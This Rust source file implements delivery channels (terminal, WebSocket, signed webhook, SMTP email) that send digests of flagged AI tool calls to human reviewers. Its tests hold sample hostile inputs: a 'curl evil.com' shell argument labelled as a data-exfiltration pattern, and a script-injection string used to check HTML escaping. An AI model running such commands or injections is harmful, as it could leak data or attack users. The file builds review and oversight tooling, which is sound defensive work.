// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Pluggable delivery backends for digest batches (CLI, webhook, email, etc.).

use crate::types::DigestItem;

/// Trait for pluggable digest delivery channels.
pub trait DigestDelivery: Send + Sync {
    /// Deliver a batch of digest items.
    fn deliver(&self, items: &[DigestItem]) -> crate::error::Result<()>;

    /// Notify that an item has been escalated. Default: no-op.
    fn notify_escalation(&self, _item: &DigestItem) -> crate::error::Result<()> {
        Ok(())
    }

    /// Name of the delivery channel.
    fn name(&self) -> &str;
}

/// CLI delivery — formats digest for terminal output.
pub struct CliDelivery;

impl DigestDelivery for CliDelivery {
    fn deliver(&self, items: &[DigestItem]) -> crate::error::Result<()> {
        if items.is_empty() {
            return Ok(());
        }
        println!("\n--- Digest: {} pending items ---\n", items.len());
        for (i, item) in items.iter().enumerate() {
            let severity = match item.severity {
                crate::types::ScoreSeverity::Low => "LOW",
                crate::types::ScoreSeverity::Medium => "MED",
                crate::types::ScoreSeverity::High => "HIGH",
                crate::types::ScoreSeverity::Critical => "CRIT",
            };
            let info_tag = if item.informational_only {
                " [INFO ONLY]"
            } else {
                ""
            };
            println!(
                "  {}. [{severity}] {:.1} | {} | {}{}",
                i + 1,
                item.composite_score,
                item.tool_call_type,
                item.arguments_summary,
                info_tag,
            );
            if !item.filter_breakdown.is_empty() {
                for fb in &item.filter_breakdown {
                    println!(
                        "     -> {} ({:.1}): {}",
                        fb.filter_name, fb.score, fb.message
                    );
                }
            }
        }
        println!("\n--- End digest ---\n");
        Ok(())
    }

    fn name(&self) -> &str {
        "cli"
    }
}

/// Web delivery — notify dashboard via WebSocket.
pub struct WebDelivery {
    /// Sender for WebSocket broadcast (injected from grith-server).
    sender: Option<tokio::sync::broadcast::Sender<String>>,
}

impl WebDelivery {
    pub fn new(sender: Option<tokio::sync::broadcast::Sender<String>>) -> Self {
        Self { sender }
    }
}

impl DigestDelivery for WebDelivery {
    fn deliver(&self, items: &[DigestItem]) -> crate::error::Result<()> {
        if let Some(sender) = &self.sender {
            let json = serde_json::to_string(items)?;
            let _ = sender.send(json);
        }
        Ok(())
    }

    fn name(&self) -> &str {
        "web"
    }
}

// ---------------------------------------------------------------------------
// Webhook delivery
// ---------------------------------------------------------------------------

/// Webhook delivery — POST digest batches to a configured HTTP endpoint.
///
/// Supports HMAC-SHA256 request signing and automatic retry with
/// exponential backoff.
#[cfg(feature = "webhook")]
pub struct WebhookDelivery {
    url: String,
    secret: Option<String>,
    client: reqwest::blocking::Client,
    max_retries: u32,
}

#[cfg(feature = "webhook")]
impl WebhookDelivery {
    /// Create a new webhook delivery targeting `url`.
    ///
    /// If `secret` is provided, each request body is signed with
    /// HMAC-SHA256 and the signature is sent as `X-Grith-Signature-256`.
    pub fn new(url: String, secret: Option<String>) -> Self {
        let client = reqwest::blocking::Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .user_agent(concat!("grith-digest/", env!("CARGO_PKG_VERSION")))
            .build()
            .unwrap_or_else(|_| reqwest::blocking::Client::new());
        tracing::info!(%url, "webhook delivery initialized");
        Self {
            url,
            secret,
            client,
            max_retries: 3,
        }
    }

    /// Compute HMAC-SHA256 hex signature for the given body.
    fn sign(&self, body: &[u8]) -> Option<String> {
        use hmac::{Hmac, Mac};
        use sha2::Sha256;

        let secret = self.secret.as_ref()?;
        let mut mac =
            Hmac::<Sha256>::new_from_slice(secret.as_bytes()).expect("HMAC accepts any key size");
        mac.update(body);
        Some(format!("sha256={:x}", mac.finalize().into_bytes()))
    }

    fn send_request(
        &self,
        body: &[u8],
        event_type: &str,
    ) -> std::result::Result<(), crate::error::Error> {
        let signature = self.sign(body);

        let mut last_err = String::new();
        for attempt in 0..=self.max_retries {
            if attempt > 0 {
                let delay = std::time::Duration::from_secs(1 << (attempt - 1));
                tracing::debug!(
                    attempt,
                    delay_secs = delay.as_secs(),
                    "webhook retry backoff"
                );
                std::thread::sleep(delay);
            }

            let mut req = self
                .client
                .post(&self.url)
                .header("Content-Type", "application/json")
                .header("X-Grith-Event", event_type);

            if let Some(ref sig) = signature {
                req = req.header("X-Grith-Signature-256", sig.as_str());
            }

            match req.body(body.to_vec()).send() {
                Ok(resp) if resp.status().is_success() => return Ok(()),
                Ok(resp) => {
                    last_err = format!("HTTP {}", resp.status());
                    tracing::warn!(
                        attempt,
                        status = %resp.status(),
                        url = %self.url,
                        "webhook delivery received non-success status"
                    );
                }
                Err(e) => {
                    last_err = e.to_string();
                    tracing::warn!(
                        attempt,
                        error = %e,
                        url = %self.url,
                        "webhook delivery failed"
                    );
                }
            }
        }

        Err(crate::error::Error::Delivery(format!(
            "webhook delivery to {} failed after {} retries: {last_err}",
            self.url, self.max_retries,
        )))
    }
}

#[cfg(feature = "webhook")]
impl DigestDelivery for WebhookDelivery {
    fn deliver(&self, items: &[DigestItem]) -> crate::error::Result<()> {
        if items.is_empty() {
            return Ok(());
        }
        let body = serde_json::to_vec(items)?;
        self.send_request(&body, "digest")
    }

    fn notify_escalation(&self, item: &DigestItem) -> crate::error::Result<()> {
        let body = serde_json::to_vec(item)?;
        self.send_request(&body, "escalation")
    }

    fn name(&self) -> &str {
        "webhook"
    }
}

// Stub when webhook feature is disabled
#[cfg(not(feature = "webhook"))]
pub struct WebhookDelivery {
    url: String,
}

#[cfg(not(feature = "webhook"))]
impl WebhookDelivery {
    pub fn new(url: String, _secret: Option<String>) -> Self {
        tracing::warn!(
            %url,
            "WebhookDelivery compiled without 'webhook' feature; deliver() will no-op"
        );
        Self { url }
    }
}

#[cfg(not(feature = "webhook"))]
impl DigestDelivery for WebhookDelivery {
    fn deliver(&self, _items: &[DigestItem]) -> crate::error::Result<()> {
        let msg = format!(
            "webhook delivery requested for {} but binary was compiled without 'webhook' feature",
            self.url
        );
        tracing::error!("{msg}");
        Err(crate::error::Error::Delivery(msg))
    }

    fn notify_escalation(&self, _item: &DigestItem) -> crate::error::Result<()> {
        let msg = format!(
            "webhook escalation delivery requested for {} but binary was compiled without 'webhook' feature",
            self.url
        );
        tracing::error!("{msg}");
        Err(crate::error::Error::Delivery(msg))
    }

    fn name(&self) -> &str {
        "webhook"
    }
}

// ---------------------------------------------------------------------------
// Email delivery
// ---------------------------------------------------------------------------

/// Email delivery — send digest batches via SMTP.
#[cfg(feature = "email")]
pub struct EmailDelivery {
    smtp_host: String,
    smtp_port: u16,
    username: String,
    password: String,
    from: String,
    to: Vec<String>,
    starttls: bool,
}

#[cfg(feature = "email")]
impl EmailDelivery {
    /// Create a new email delivery channel.
    pub fn new(
        smtp_host: String,
        smtp_port: u16,
        username: String,
        password: String,
        from: String,
        to: Vec<String>,
        starttls: bool,
    ) -> Self {
        tracing::info!(
            smtp_host = %smtp_host,
            smtp_port,
            from = %from,
            recipients = to.len(),
            "email delivery initialized"
        );
        Self {
            smtp_host,
            smtp_port,
            username,
            password,
            from,
            to,
            starttls,
        }
    }

    /// Build an HTML email body from digest items.
    fn build_html(items: &[DigestItem]) -> String {
        let mut html = String::from(
            "<html><body>\
             <h2>grith Digest Report</h2>\
             <p>The following tool calls require your review:</p>\
             <table border='1' cellpadding='6' cellspacing='0' \
                    style='border-collapse:collapse;font-family:monospace;font-size:13px'>\
             <tr style='background:#333;color:#fff'>\
               <th>#</th><th>Severity</th><th>Score</th>\
               <th>Type</th><th>Arguments</th><th>Status</th>\
             </tr>",
        );

        for (i, item) in items.iter().enumerate() {
            let severity = match item.severity {
                crate::types::ScoreSeverity::Low => "LOW",
                crate::types::ScoreSeverity::Medium => "MED",
                crate::types::ScoreSeverity::High => "HIGH",
                crate::types::ScoreSeverity::Critical => "CRIT",
            };
            let bg = if i % 2 == 0 { "#f8f8f8" } else { "#ffffff" };
            html.push_str(&format!(
                "<tr style='background:{bg}'>\
                 <td>{}</td><td>{severity}</td><td>{:.1}</td>\
                 <td>{}</td><td>{}</td><td>{:?}</td></tr>",
                i + 1,
                item.composite_score,
                html_escape(&item.tool_call_type),
                html_escape(&item.arguments_summary),
                item.status,
            ));
        }

        html.push_str(
            "</table><p style='color:#888;font-size:11px'>\
                       Sent by grith digest system</p></body></html>",
        );
        html
    }

    fn send_email(
        &self,
        subject: &str,
        html_body: &str,
    ) -> std::result::Result<(), crate::error::Error> {
        use lettre::message::header::ContentType;
        use lettre::transport::smtp::authentication::Credentials;
        use lettre::{Message, SmtpTransport, Transport};

        let creds = Credentials::new(self.username.clone(), self.password.clone());

        let transport = if self.starttls {
            SmtpTransport::starttls_relay(&self.smtp_host)
                .map_err(|e| crate::error::Error::Delivery(format!("SMTP TLS error: {e}")))?
                .port(self.smtp_port)
                .credentials(creds)
                .build()
        } else {
            SmtpTransport::relay(&self.smtp_host)
                .map_err(|e| crate::error::Error::Delivery(format!("SMTP relay error: {e}")))?
                .port(self.smtp_port)
                .credentials(creds)
                .build()
        };

        for recipient in &self.to {
            let email = Message::builder()
                .from(
                    self.from
                        .parse()
                        .map_err(|e| crate::error::Error::Delivery(format!("bad from: {e}")))?,
                )
                .to(recipient
                    .parse()
                    .map_err(|e| crate::error::Error::Delivery(format!("bad to: {e}")))?)
                .subject(subject)
                .header(ContentType::TEXT_HTML)
                .body(html_body.to_string())
                .map_err(|e| crate::error::Error::Delivery(format!("email build: {e}")))?;

            transport
                .send(&email)
                .map_err(|e| crate::error::Error::Delivery(format!("SMTP send: {e}")))?;
        }

        Ok(())
    }
}

#[cfg(feature = "email")]
impl DigestDelivery for EmailDelivery {
    fn deliver(&self, items: &[DigestItem]) -> crate::error::Result<()> {
        if items.is_empty() {
            return Ok(());
        }
        let subject = format!("[grith] Digest: {} items pending review", items.len());
        let html = Self::build_html(items);
        self.send_email(&subject, &html)
    }

    fn notify_escalation(&self, item: &DigestItem) -> crate::error::Result<()> {
        let subject = format!(
            "[grith] ESCALATION: {} (score {:.1})",
            item.tool_call_type, item.composite_score
        );
        let html = Self::build_html(std::slice::from_ref(item));
        self.send_email(&subject, &html)
    }

    fn name(&self) -> &str {
        "email"
    }
}

// Stub when email feature is disabled
#[cfg(not(feature = "email"))]
pub struct EmailDelivery;

#[cfg(not(feature = "email"))]
impl EmailDelivery {
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        _smtp_host: String,
        _smtp_port: u16,
        _username: String,
        _password: String,
        _from: String,
        _to: Vec<String>,
        _starttls: bool,
    ) -> Self {
        tracing::warn!("EmailDelivery compiled without 'email' feature; deliver() will no-op");
        Self
    }
}

#[cfg(not(feature = "email"))]
impl DigestDelivery for EmailDelivery {
    fn deliver(&self, _items: &[DigestItem]) -> crate::error::Result<()> {
        let msg = "email delivery requested but binary was compiled without 'email' feature";
        tracing::error!("{msg}");
        Err(crate::error::Error::Delivery(msg.to_string()))
    }

    fn notify_escalation(&self, _item: &DigestItem) -> crate::error::Result<()> {
        let msg =
            "email escalation delivery requested but binary was compiled without 'email' feature";
        tracing::error!("{msg}");
        Err(crate::error::Error::Delivery(msg.to_string()))
    }

    fn name(&self) -> &str {
        "email"
    }
}

/// Escape HTML special characters.
fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::*;
    use chrono::Utc;
    use uuid::Uuid;

    fn make_items() -> Vec<DigestItem> {
        vec![DigestItem {
            id: Uuid::new_v4(),
            created_at: Utc::now(),
            session_id: None,
            tool_call_type: "ShellExec".into(),
            arguments_summary: "curl evil.com".into(),
            composite_score: 5.5,
            severity: ScoreSeverity::High,
            filter_breakdown: vec![FilterBreakdown {
                filter_name: "command".into(),
                score: 4.0,
                rule_id: "pipe-to-curl".into(),
                message: "data exfiltration pattern".into(),
            }],
            task_context: None,
            plugin_id: "shell".into(),
            status: DigestStatus::Pending,
            reviewed_at: None,
            review_action: None,
            reviewer_notes: None,
            informational_only: false,
            escalated_at: None,
            escalated_by: None,
        }]
    }

    #[test]
    fn test_cli_delivery() {
        let delivery = CliDelivery;
        delivery.deliver(&make_items()).unwrap();
    }

    #[test]
    fn test_cli_delivery_empty() {
        let delivery = CliDelivery;
        delivery.deliver(&[]).unwrap();
    }

    #[test]
    fn test_web_delivery_no_sender() {
        let delivery = WebDelivery::new(None);
        delivery.deliver(&make_items()).unwrap();
    }

    #[test]
    fn test_default_notify_escalation() {
        let delivery = CliDelivery;
        delivery.notify_escalation(&make_items()[0]).unwrap();
    }

    #[cfg(feature = "webhook")]
    #[test]
    fn test_webhook_delivery_serialization() {
        // Verify that digest items serialize to expected JSON structure
        let items = make_items();
        let body = serde_json::to_vec(&items).unwrap();
        let parsed: Vec<serde_json::Value> = serde_json::from_slice(&body).unwrap();
        assert_eq!(parsed.len(), 1);
        assert_eq!(parsed[0]["tool_call_type"], "ShellExec");
        assert_eq!(parsed[0]["composite_score"], 5.5);
    }

    #[cfg(feature = "webhook")]
    #[test]
    fn test_webhook_hmac_signature() {
        let delivery = WebhookDelivery::new(
            "https://hooks.example.com/test".into(),
            Some("test-secret".into()),
        );
        let body = b"test payload";
        let sig = delivery.sign(body);
        assert!(sig.is_some());
        let sig = sig.unwrap();
        assert!(sig.starts_with("sha256="));
        // Verify determinism
        assert_eq!(sig, delivery.sign(body).unwrap());
    }

    #[cfg(feature = "webhook")]
    #[test]
    fn test_webhook_no_secret_no_signature() {
        let delivery = WebhookDelivery::new("https://hooks.example.com/test".into(), None);
        assert!(delivery.sign(b"test").is_none());
    }

    #[cfg(feature = "webhook")]
    #[test]
    fn test_webhook_delivery_error_invalid_url() {
        let delivery = WebhookDelivery::new("http://[::1]:0/nonexistent".into(), None);
        let result = delivery.deliver(&make_items());
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(
            err.contains("delivery"),
            "error should mention delivery: {err}"
        );
    }

    #[cfg(feature = "email")]
    #[test]
    fn test_email_html_formatting() {
        let items = make_items();
        let html = EmailDelivery::build_html(&items);
        assert!(html.contains("<table"));
        assert!(html.contains("ShellExec"));
        assert!(html.contains("5.5"));
        assert!(html.contains("HIGH"));
        assert!(html.contains("grith Digest Report"));
    }

    #[cfg(feature = "email")]
    #[test]
    fn test_email_html_escaping() {
        let mut items = make_items();
        items[0].arguments_summary = "<script>alert('xss')</script>".into();
        let html = EmailDelivery::build_html(&items);
        assert!(!html.contains("<script>"));
        assert!(html.contains("&lt;script&gt;"));
    }

    #[test]
    fn test_html_escape() {
        assert_eq!(html_escape("<b>test</b>"), "&lt;b&gt;test&lt;/b&gt;");
        assert_eq!(html_escape("a&b"), "a&amp;b");
        assert_eq!(html_escape("\"hi\""), "&quot;hi&quot;");
    }
}
